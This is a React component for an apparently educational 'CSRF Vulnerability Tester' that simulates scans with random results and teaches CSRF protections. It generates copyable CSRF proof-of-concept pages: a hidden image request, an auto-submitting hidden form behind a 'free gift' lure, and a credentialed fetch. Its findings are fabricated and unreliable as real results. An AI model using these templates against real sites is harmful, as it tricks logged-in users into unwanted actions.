import React, { useState, useEffect } from 'react';
import { useTerminal } from '@/hooks/use-terminal';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Checkbox } from '@/components/ui/checkbox';
import { Progress } from '@/components/ui/progress';
import { 
  AlertCircle, 
  Play, 
  Code, 
  ShieldCheck, 
  ShieldAlert, 
  AlertTriangle,
  Copy,
  Loader2,
  ExternalLink,
  Hammer,
  FileCode,
  Shield
} from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { cn } from '@/lib/utils';

interface CsrfTesterProps {
  onTestComplete?: (result: any) => void;
}

interface CsrfVulnerability {
  id: string;
  target: string;
  method: string;
  vulnerable: boolean;
  confidence: 'High' | 'Medium' | 'Low';
  description: string;
  mitigation: string;
  details?: string;
  exploitCode?: string;
}

interface CsrfTestResult {
  target: string;
  timestamp: Date;
  vulnerabilities: CsrfVulnerability[];
  testedForms: number;
  testedEndpoints: number;
  duration: string;
}

export default function CsrfTester({ onTestComplete }: CsrfTesterProps) {
  const [target, setTarget] = useState<string>('');
  const [headers, setHeaders] = useState<string>('');
  const [cookies, setCookies] = useState<string>('');
  const [testMethod, setTestMethod] = useState<string>('automated');
  const [customEndpoints, setCustomEndpoints] = useState<string>('');
  const [testProgress, setTestProgress] = useState<number>(0);
  const [isTesting, setIsTesting] = useState<boolean>(false);
  const [testResults, setTestResults] = useState<CsrfTestResult | null>(null);
  const [selectedVulnerability, setSelectedVulnerability] = useState<CsrfVulnerability | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [activeTab, setActiveTab] = useState<string>('test');
  
  const { addSystemLine, addInfoLine, addErrorLine, addCommandLine, addLine } = useTerminal();
  const { toast } = useToast();
  
  // Reset error state when inputs change
  useEffect(() => {
    setError(null);
  }, [target, headers, cookies, testMethod, customEndpoints]);
  
  // Simulated test progress
  useEffect(() => {
    let progressInterval: NodeJS.Timeout;
    
    if (isTesting && testProgress < 100) {
      progressInterval = setInterval(() => {
        setTestProgress(prev => {
          const increment = Math.floor(Math.random() * 5) + 1;
          const newProgress = Math.min(prev + increment, 100);
          
          // Complete test when reaching 100%
          if (newProgress === 100) {
            setTimeout(() => completeTest(), 500);
          }
          
          return newProgress;
        });
      }, 300);
    }
    
    return () => {
      if (progressInterval) clearInterval(progressInterval);
    };
  }, [isTesting, testProgress]);
  
  // Start the CSRF test
  const startTest = () => {
    if (!target) {
      setError('Target URL is required');
      addErrorLine('Target URL is required');
      return;
    }
    
    // Validate URL format
    try {
      const url = new URL(target);
      if (!url.protocol.startsWith('http')) {
        throw new Error('URL must use HTTP or HTTPS protocol');
      }
    } catch (e) {
      setError('Invalid URL format. Please include http:// or https://');
      addErrorLine('Invalid URL format. Please include http:// or https://');
      return;
    }
    
    setIsTesting(true);
    setTestProgress(0);
    setTestResults(null);
    setSelectedVulnerability(null);
    setError(null);
    
    // Log test settings in terminal
    const commandArgs = [
      `--target ${target}`,
      testMethod === 'automated' ? '--scan-forms' : '',
      testMethod === 'manual' && customEndpoints ? '--endpoints "..."' : '',
      headers ? '--headers "..."' : '',
      cookies ? '--cookies "..."' : ''
    ].filter(Boolean).join(' ');
    
    addCommandLine(`csrf-test ${commandArgs}`);
    addInfoLine(`Starting CSRF vulnerability test on ${target}`);
    
    if (testMethod === 'automated') {
      addInfoLine("Crawling website to discover forms and endpoints...");
    } else {
      addInfoLine("Testing specific endpoints for CSRF vulnerabilities...");
    }
  };
  
  // Complete the test with simulated results
  const completeTest = () => {
    setIsTesting(false);
    
    // Generate simulated test results
    const simulatedResults = generateSimulatedResults();
    setTestResults(simulatedResults);
    
    // Log summary in terminal
    addLine(`[COMPLETE] CSRF test completed in ${simulatedResults.duration}`, "success");
    addInfoLine(`Tested ${simulatedResults.testedForms} forms and ${simulatedResults.testedEndpoints} endpoints`);
    
    const vulnerableCount = simulatedResults.vulnerabilities.filter(v => v.vulnerable).length;
    
    if (vulnerableCount > 0) {
      addLine(`[ALERT] Found ${vulnerableCount} potential CSRF vulnerabilities!`, "error");
      
      // Log some of the findings
      simulatedResults.vulnerabilities
        .filter(v => v.vulnerable)
        .slice(0, 2)
        .forEach(vuln => {
          addLine(`Vulnerable endpoint: ${vuln.target} (${vuln.method})`, "error");
        });
      
      if (vulnerableCount > 2) {
        addLine(`... and ${vulnerableCount - 2} more vulnerabilities.`, "info");
      }
    } else {
      addLine(`[SECURE] No CSRF vulnerabilities detected`, "success");
    }
    
    // Show toast notification
    toast({
      title: vulnerableCount > 0 ? "CSRF Vulnerabilities Found" : "Test Complete",
      description: vulnerableCount > 0 
        ? `Found ${vulnerableCount} potential CSRF vulnerabilities` 
        : "No CSRF vulnerabilities detected",
      variant: vulnerableCount > 0 ? "destructive" : "default",
    });
    
    // Call completion callback if provided
    if (onTestComplete) {
      onTestComplete(simulatedResults);
    }
  };
  
  // Generate simulated test results
  const generateSimulatedResults = (): CsrfTestResult => {
    // Random number of forms and endpoints
    const testedForms = Math.floor(Math.random() * 10) + 2;
    const testedEndpoints = Math.floor(Math.random() * 15) + 5;
    
    // Random time duration
    const minutes = Math.floor(Math.random() * 2);
    const seconds = Math.floor(Math.random() * 50) + 10;
    const duration = minutes > 0 ? `${minutes}m ${seconds}s` : `${seconds}s`;
    
    // Determine number of vulnerabilities (0-4)
    const vulnCount = Math.floor(Math.random() * 5);
    
    // Generate endpoints - with and without CSRF protections
    const endpoints = [
      { path: '/login', method: 'POST', hasProtection: true },
      { path: '/register', method: 'POST', hasProtection: true },
      { path: '/profile/update', method: 'POST', hasProtection: Math.random() > 0.3 },
      { path: '/api/users', method: 'POST', hasProtection: Math.random() > 0.4 },
      { path: '/api/settings', method: 'PUT', hasProtection: Math.random() > 0.5 },
      { path: '/account/password', method: 'POST', hasProtection: Math.random() > 0.3 },
      { path: '/comments/add', method: 'POST', hasProtection: Math.random() > 0.6 },
      { path: '/api/posts', method: 'POST', hasProtection: Math.random() > 0.5 },
      { path: '/admin/users/delete', method: 'POST', hasProtection: Math.random() > 0.2 },
      { path: '/user/preferences', method: 'PUT', hasProtection: Math.random() > 0.7 },
      { path: '/api/contact', method: 'POST', hasProtection: Math.random() > 0.6 },
    ];
    
    // Shuffle and pick endpoints
    const shuffledEndpoints = [...endpoints].sort(() => 0.5 - Math.random());
    
    // Generate vulnerabilities
    const vulnerabilities: CsrfVulnerability[] = [];
    
    for (let i = 0; i < vulnCount; i++) {
      // Pick an endpoint without CSRF protection
      const endpoint = shuffledEndpoints.find(e => !e.hasProtection) || shuffledEndpoints[0];
      
      // Random confidence level
      const confidenceLevels: ('High' | 'Medium' | 'Low')[] = ['High', 'Medium', 'Low'];
      const confidence = confidenceLevels[Math.floor(Math.random() * confidenceLevels.length)];
      
      // Build target URL
      const targetUrl = new URL(target);
      const fullTarget = `${targetUrl.origin}${endpoint.path}`;
      
      // Generate exploit code
      const exploitCode = generateExploitCode(fullTarget, endpoint.method);
      
      vulnerabilities.push({
        id: `CSRF-${i + 1}`,
        target: fullTarget,
        method: endpoint.method,
        vulnerable: true,
        confidence,
        description: "The endpoint does not implement proper CSRF protections. No CSRF token was found in the request, and the server accepted the request without validating the origin.",
        mitigation: "Implement CSRF tokens for all state-changing requests. Add the 'SameSite=Strict' attribute to cookies, and validate the Origin and Referer headers on the server side.",
        details: "The application accepts POST/PUT/DELETE requests without validating a CSRF token. This could allow attackers to trick authenticated users into performing actions without their knowledge or consent.",
        exploitCode
      });
    }
    
    // Generate some non-vulnerable endpoints for completeness
    const nonVulnerableCount = Math.floor(Math.random() * 3) + 1;
    
    for (let i = 0; i < nonVulnerableCount; i++) {
      // Pick an endpoint with CSRF protection
      const endpoint = shuffledEndpoints.find(e => e.hasProtection) || shuffledEndpoints[0];
      
      // Build target URL
      const targetUrl = new URL(target);
      const fullTarget = `${targetUrl.origin}${endpoint.path}`;
      
      vulnerabilities.push({
        id: `CSRF-${vulnCount + i + 1}`,
        target: fullTarget,
        method: endpoint.method,
        vulnerable: false,
        confidence: 'High',
        description: "The endpoint properly implements CSRF protections. CSRF tokens were found in the request, and the server validates the token before processing the request.",
        mitigation: "Continue using CSRF tokens and other protections as currently implemented.",
        details: "The application correctly implements anti-CSRF measures including proper token validation."
      });
    }
    
    return {
      target,
      timestamp: new Date(),
      vulnerabilities,
      testedForms,
      testedEndpoints,
      duration
    };
  };
  
  // Generate example exploit code for a vulnerable endpoint
  const generateExploitCode = (targetUrl: string, method: string): string => {
    if (method === 'GET') {
      return `<script>
  // CSRF exploit to make a GET request to ${targetUrl}
  var img = document.createElement('img');
  img.src = "${targetUrl}";
  img.style.display = "none";
  document.body.appendChild(img);
</script>`;
    } else if (method === 'POST') {
      return `<html>
  <body>
    <h3>Click me for a free gift!</h3>
    <form id="csrf-form" action="${targetUrl}" method="POST">
      <input type="hidden" name="user_id" value="123" />
      <input type="hidden" name="action" value="update" />
      <input type="submit" value="Click Me!" />
    </form>
    <script>
      // Automatically submit the form when the page loads
      document.getElementById("csrf-form").submit();
    </script>
  </body>
</html>`;
    } else {
      return `<html>
  <body>
    <h3>Click me for a free gift!</h3>
    <script>
      // CSRF exploit to make a ${method} request to ${targetUrl}
      function csrfAttack() {
        fetch("${targetUrl}", {
          method: "${method}",
          credentials: "include",
          body: JSON.stringify({
            user_id: "123",
            action: "update"
          }),
          headers: {
            "Content-Type": "application/json"
          }
        });
      }
      // Execute the attack when the page loads
      csrfAttack();
    </script>
    <button onclick="csrfAttack()">Click me!</button>
  </body>
</html>`;
    }
  };
  
  // Copy exploit code to clipboard
  const copyExploitCode = (code: string) => {
    navigator.clipboard.writeText(code)
      .then(() => {
        toast({
          title: "Code copied",
          description: "Exploit code has been copied to clipboard",
          variant: "default",
        });
      })
      .catch(err => {
        toast({
          title: "Copy failed",
          description: `Failed to copy code: ${err.message}`,
          variant: "destructive"
        });
      });
  };
  
  // Get the confidence badge color
  const getConfidenceBadgeColor = (confidence: string): string => {
    switch (confidence) {
      case 'High':
        return 'bg-red-500/10 text-red-500';
      case 'Medium':
        return 'bg-orange-500/10 text-orange-500';
      case 'Low':
        return 'bg-yellow-500/10 text-yellow-500';
      default:
        return 'bg-blue-500/10 text-blue-500';
    }
  };
  
  return (
    <div className="space-y-6">
      <Card className="p-4 border-primary/30 bg-card">
        <h2 className="text-xl font-tech text-primary mb-4">CSRF Vulnerability Tester</h2>
        
        <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
          <TabsList className="grid grid-cols-2 mb-2">
            <TabsTrigger value="test" className="text-xs font-mono">Test Configuration</TabsTrigger>
            <TabsTrigger value="learn" className="text-xs font-mono">Learn</TabsTrigger>
          </TabsList>
          
          <TabsContent value="test" className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="target-url" className="text-sm font-tech">
                Target URL
              </Label>
              <Input
                id="target-url"
                placeholder="https://example.com"
                value={target}
                onChange={(e) => setTarget(e.target.value)}
                className="font-mono"
                disabled={isTesting}
              />
              <p className="text-xs font-mono text-muted-foreground mt-1">
                Enter the full URL of the website to test for CSRF vulnerabilities
              </p>
            </div>
            
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div className="space-y-2">
                <Label htmlFor="test-method" className="text-sm font-tech">
                  Test Method
                </Label>
                <Select 
                  value={testMethod} 
                  onValueChange={setTestMethod}
                  disabled={isTesting}
                >
                  <SelectTrigger id="test-method" className="font-mono">
                    <SelectValue placeholder="Select method" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="automated">Automated Scanning</SelectItem>
                    <SelectItem value="manual">Manual Endpoint Testing</SelectItem>
                  </SelectContent>
                </Select>
                <p className="text-xs font-mono text-muted-foreground mt-1">
                  Automated scanning crawls the website to discover forms and endpoints
                </p>
              </div>
              
              <div className="space-y-2">
                <Label htmlFor="cookies" className="text-sm font-tech">
                  Cookies (Optional)
                </Label>
                <Input
                  id="cookies"
                  placeholder="name=value; name2=value2"
                  value={cookies}
                  onChange={(e) => setCookies(e.target.value)}
                  className="font-mono"
                  disabled={isTesting}
                />
                <p className="text-xs font-mono text-muted-foreground mt-1">
                  Session cookies for authenticated testing
                </p>
              </div>
            </div>
            
            {testMethod === 'manual' && (
              <div className="space-y-2">
                <Label htmlFor="custom-endpoints" className="text-sm font-tech">
                  Custom Endpoints
                </Label>
                <Textarea
                  id="custom-endpoints"
                  placeholder="/api/user/update\n/api/settings/save\n/api/comments/post"
                  value={customEndpoints}
                  onChange={(e) => setCustomEndpoints(e.target.value)}
                  className="font-mono h-20"
                  disabled={isTesting}
                />
                <p className="text-xs font-mono text-muted-foreground mt-1">
                  Enter one endpoint per line. These will be tested specifically for CSRF vulnerabilities.
                </p>
              </div>
            )}
            
            <div className="space-y-2">
              <Label htmlFor="headers" className="text-sm font-tech">
                Custom Headers (Optional)
              </Label>
              <Textarea
                id="headers"
                placeholder="X-Auth-Token: abcdef123456\nContent-Type: application/json"
                value={headers}
                onChange={(e) => setHeaders(e.target.value)}
                className="font-mono h-20"
                disabled={isTesting}
              />
              <p className="text-xs font-mono text-muted-foreground mt-1">
                Enter one header per line in "Name: Value" format
              </p>
            </div>
            
            {error && (
              <div className="bg-destructive/10 p-3 rounded-md border border-destructive/50 text-destructive flex items-start gap-2 text-sm font-mono">
                <AlertCircle className="h-4 w-4 mt-0.5" />
                <span>{error}</span>
              </div>
            )}
            
            <div className="flex flex-col sm:flex-row space-y-2 sm:space-y-0 sm:space-x-3">
              <Button
                onClick={startTest}
                disabled={isTesting}
                className="bg-primary text-primary-foreground hover:bg-primary/90 font-tech"
              >
                {isTesting ? (
                  <span className="flex items-center">
                    <Loader2 className="h-4 w-4 mr-2 animate-spin" />
                    Testing...
                  </span>
                ) : (
                  <span className="flex items-center">
                    <ShieldCheck className="h-4 w-4 mr-2" />
                    Start CSRF Test
                  </span>
                )}
              </Button>
            </div>
            
            {isTesting && (
              <div className="space-y-2">
                <div className="flex justify-between text-xs font-mono">
                  <span>Test in progress...</span>
                  <span>{testProgress}%</span>
                </div>
                <Progress value={testProgress} className="h-2" />
                <p className="text-xs font-mono text-muted-foreground animate-pulse">
                  {testProgress < 25 ? "Analyzing website structure..." : 
                   testProgress < 50 ? "Discovering forms and endpoints..." :
                   testProgress < 75 ? "Testing for CSRF protections..." :
                   "Validating findings..."}
                </p>
              </div>
            )}
          </TabsContent>
          
          <TabsContent value="learn" className="space-y-4">
            <div className="bg-card p-4 rounded-md border border-border text-sm font-mono space-y-4">
              <h3 className="text-primary font-tech">What is CSRF?</h3>
              <p className="text-muted-foreground">
                Cross-Site Request Forgery (CSRF) is an attack that forces authenticated users to execute unwanted actions on a web application in which they're currently authenticated.
              </p>
              
              <h3 className="text-primary font-tech mt-4">How CSRF Works</h3>
              <div className="space-y-2 text-muted-foreground">
                <p>1. User authenticates with a trusted site (e.g., bank.com)</p>
                <p>2. The authentication creates a session cookie</p>
                <p>3. User visits a malicious site without logging out of the trusted site</p>
                <p>4. The malicious site triggers a request to the trusted site</p>
                <p>5. The browser automatically includes the session cookie</p>
                <p>6. The trusted site executes the action thinking it's legitimate</p>
              </div>
              
              <h3 className="text-primary font-tech mt-4">Common CSRF Protections</h3>
              <div className="space-y-2 text-muted-foreground">
                <p>• <span className="text-primary">CSRF Tokens</span>: Server generates unique tokens for each form/request</p>
                <p>• <span className="text-primary">SameSite Cookies</span>: Restrict cookies to same-site requests</p>
                <p>• <span className="text-primary">Custom Headers</span>: Require custom headers that can't be added in cross-site requests</p>
                <p>• <span className="text-primary">Referrer Checking</span>: Verify requests are coming from your own domain</p>
                <p>• <span className="text-primary">Double Submit Cookies</span>: Compare a cookie value with a request parameter</p>
              </div>
            </div>
            
            <div className="p-3 rounded-md bg-primary/5 border border-primary/20 text-xs font-mono">
              <p className="flex items-center text-primary font-tech">
                <AlertTriangle className="h-3.5 w-3.5 mr-1.5" />
                For Educational Purposes Only
              </p>
              <div className="mt-2 text-muted-foreground">
                <p>
                  This tool is designed for educational purposes and security testing of your own applications.
                  Always obtain proper authorization before testing any website for security vulnerabilities.
                </p>
              </div>
            </div>
          </TabsContent>
        </Tabs>
      </Card>
      
      {testResults && (
        <Card className="p-4 border-secondary/30 bg-card">
          <div className="flex items-center justify-between mb-4">
            <h2 className="text-lg font-tech text-secondary">CSRF Test Results</h2>
            <div className="text-xs font-mono text-muted-foreground">
              {testResults.duration} • {new Date(testResults.timestamp).toLocaleString()}
            </div>
          </div>
          
          <div className="space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4">
              <div className="bg-background p-3 rounded-md border border-border">
                <div className="text-xs font-mono text-muted-foreground">Target</div>
                <div className="text-base font-tech mt-1 truncate" title={testResults.target}>
                  {testResults.target}
                </div>
              </div>
              
              <div className="bg-background p-3 rounded-md border border-border">
                <div className="text-xs font-mono text-muted-foreground">Tested Endpoints</div>
                <div className="text-base font-tech mt-1">
                  {testResults.testedEndpoints}
                </div>
              </div>
              
              <div className="bg-background p-3 rounded-md border border-border">
                <div className="text-xs font-mono text-muted-foreground">Vulnerabilities</div>
                <div className="text-base font-tech mt-1 flex items-center">
                  <span className={testResults.vulnerabilities.filter(v => v.vulnerable).length > 0 ? 'text-red-500' : 'text-green-500'}>
                    {testResults.vulnerabilities.filter(v => v.vulnerable).length}
                  </span>
                  {testResults.vulnerabilities.filter(v => v.vulnerable).length === 0 && (
                    <ShieldCheck className="h-4 w-4 ml-2 text-green-500" />
                  )}
                </div>
              </div>
            </div>
            
            <Tabs defaultValue="vulnerabilities" className="w-full">
              <TabsList className="grid grid-cols-2 mb-2">
                <TabsTrigger value="vulnerabilities" className="text-xs font-mono">
                  Vulnerabilities ({testResults.vulnerabilities.filter(v => v.vulnerable).length})
                </TabsTrigger>
                <TabsTrigger value="details" className="text-xs font-mono" disabled={!selectedVulnerability}>
                  Vulnerability Details
                </TabsTrigger>
              </TabsList>
              
              <TabsContent value="vulnerabilities">
                {testResults.vulnerabilities.filter(v => v.vulnerable).length === 0 ? (
                  <div className="bg-green-500/10 border border-green-500/20 rounded-md p-4 text-center">
                    <ShieldCheck className="h-6 w-6 text-green-500 mx-auto mb-2" />
                    <p className="text-sm font-tech text-green-500">No CSRF Vulnerabilities Detected</p>
                    <p className="text-xs font-mono text-muted-foreground mt-2">
                      All tested endpoints appear to implement proper CSRF protections. Continue to maintain these security controls.
                    </p>
                  </div>
                ) : (
                  <div className="border border-border rounded-md overflow-hidden">
                    <div className="bg-muted p-2 grid grid-cols-12 gap-2 font-tech text-xs border-b border-border">
                      <div className="col-span-5">Endpoint</div>
                      <div className="col-span-2">Method</div>
                      <div className="col-span-3">Confidence</div>
                      <div className="col-span-2">Actions</div>
                    </div>
                    
                    <div className="max-h-64 overflow-y-auto">
                      {testResults.vulnerabilities.filter(v => v.vulnerable).map((vuln, index) => (
                        <div 
                          key={index}
                          className={cn(
                            "p-2 grid grid-cols-12 gap-2 font-mono text-xs",
                            index % 2 === 0 ? "bg-background" : "bg-muted",
                            selectedVulnerability?.id === vuln.id ? "bg-primary/10 border-l-2 border-l-primary" : ""
                          )}
                        >
                          <div className="col-span-5 truncate" title={vuln.target}>
                            {vuln.target}
                          </div>
                          <div className="col-span-2">
                            {vuln.method}
                          </div>
                          <div className="col-span-3">
                            <span className={cn(
                              "px-2 py-0.5 rounded-full text-xs font-tech", 
                              getConfidenceBadgeColor(vuln.confidence)
                            )}>
                              {vuln.confidence}
                            </span>
                          </div>
                          <div className="col-span-2 flex space-x-2">
                            <Button
                              variant="ghost"
                              size="sm"
                              className="h-6 w-6 p-0"
                              onClick={() => setSelectedVulnerability(vuln)}
                              title="View details"
                            >
                              <FileCode className="h-3.5 w-3.5" />
                            </Button>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
                
                {testResults.vulnerabilities.some(v => !v.vulnerable) && (
                  <div className="mt-4">
                    <h3 className="text-sm font-tech mb-2">Protected Endpoints</h3>
                    <div className="border border-border rounded-md overflow-hidden">
                      <div className="bg-muted p-2 grid grid-cols-12 gap-2 font-tech text-xs border-b border-border">
                        <div className="col-span-8">Endpoint</div>
                        <div className="col-span-4">Method</div>
                      </div>
                      
                      <div className="max-h-32 overflow-y-auto">
                        {testResults.vulnerabilities.filter(v => !v.vulnerable).map((vuln, index) => (
                          <div 
                            key={index}
                            className={cn(
                              "p-2 grid grid-cols-12 gap-2 font-mono text-xs",
                              index % 2 === 0 ? "bg-background" : "bg-muted"
                            )}
                          >
                            <div className="col-span-8 truncate" title={vuln.target}>
                              {vuln.target}
                            </div>
                            <div className="col-span-4">
                              {vuln.method}
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  </div>
                )}
              </TabsContent>
              
              <TabsContent value="details">
                {selectedVulnerability && (
                  <div className="space-y-4">
                    <div className="bg-background p-4 rounded-md border border-border">
                      <div className="flex items-center justify-between">
                        <h3 className="text-sm font-tech flex items-center">
                          <ShieldAlert className="h-4 w-4 mr-2 text-red-500" />
                          <span>CSRF Vulnerability Details</span>
                        </h3>
                        <span className={cn(
                          "px-2 py-0.5 rounded-full text-xs font-tech", 
                          getConfidenceBadgeColor(selectedVulnerability.confidence)
                        )}>
                          {selectedVulnerability.confidence} Confidence
                        </span>
                      </div>
                      
                      <div className="space-y-3 mt-3 text-xs font-mono">
                        <div className="grid grid-cols-4 gap-1">
                          <div className="text-muted-foreground">Endpoint:</div>
                          <div className="col-span-3 break-all">{selectedVulnerability.target}</div>
                        </div>
                        
                        <div className="grid grid-cols-4 gap-1">
                          <div className="text-muted-foreground">Method:</div>
                          <div className="col-span-3">{selectedVulnerability.method}</div>
                        </div>
                        
                        <div>
                          <div className="text-muted-foreground mb-1">Description:</div>
                          <div className="p-2 bg-muted rounded-sm">{selectedVulnerability.description}</div>
                        </div>
                        
                        {selectedVulnerability.details && (
                          <div>
                            <div className="text-muted-foreground mb-1">Technical Details:</div>
                            <div className="p-2 bg-muted rounded-sm">{selectedVulnerability.details}</div>
                          </div>
                        )}
                      </div>
                    </div>
                    
                    {selectedVulnerability.exploitCode && (
                      <div className="bg-background p-4 rounded-md border border-border">
                        <div className="flex items-center justify-between mb-2">
                          <h3 className="text-sm font-tech flex items-center">
                            <Code className="h-4 w-4 mr-2 text-primary" />
                            <span>Proof of Concept</span>
                          </h3>
                          <Button
                            variant="outline"
                            size="sm"
                            className="h-7 text-xs"
                            onClick={() => copyExploitCode(selectedVulnerability.exploitCode!)}
                          >
                            <Copy className="h-3.5 w-3.5 mr-1" />
                            Copy Code
                          </Button>
                        </div>
                        
                        <div className="p-3 bg-black rounded-sm overflow-x-auto">
                          <pre className="text-xs font-mono text-green-400">
                            {selectedVulnerability.exploitCode}
                          </pre>
                        </div>
                        
                        <p className="text-xs text-muted-foreground mt-2 flex items-center">
                          <AlertTriangle className="h-3 w-3 text-yellow-500 mr-1" />
                          This proof of concept demonstrates how an attacker could exploit this vulnerability.
                        </p>
                      </div>
                    )}
                    
                    <div className="bg-background p-4 rounded-md border border-border">
                      <h3 className="text-sm font-tech flex items-center mb-2">
                        <ShieldCheck className="h-4 w-4 mr-2 text-green-500" />
                        <span>Mitigation Recommendations</span>
                      </h3>
                      
                      <div className="p-3 bg-green-500/5 border border-green-500/20 rounded-sm text-xs font-mono">
                        {selectedVulnerability.mitigation}
                      </div>
                      
                      <div className="mt-4 space-y-2 text-xs font-mono">
                        <h4 className="text-primary">Implementation Example:</h4>
                        <div className="p-3 bg-muted rounded-sm overflow-x-auto">
                          <pre className="text-xs">
                            {`// Server-side (Node.js/Express example)
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.post('/api/update', csrfProtection, (req, res) => {
  // The request will only proceed if the CSRF token is valid
});

// Client-side (template example)
<form action="/api/update" method="post">
  <input type="hidden" name="_csrf" value="{{csrfToken}}">
  <!-- other form fields -->
  <button type="submit">Submit</button>
</form>`}
                          </pre>
                        </div>
                      </div>
                    </div>
                  </div>
                )}
              </TabsContent>
            </Tabs>
            
            <div className="flex items-center text-xs text-muted-foreground mt-2">
              <Shield className="h-3 w-3 mr-1" />
              <span>
                This is a simulated result for educational purposes only.
                In a real CSRF tester, this would show actual vulnerabilities found in the target website.
              </span>
            </div>
          </div>
        </Card>
      )}
    </div>
  );
}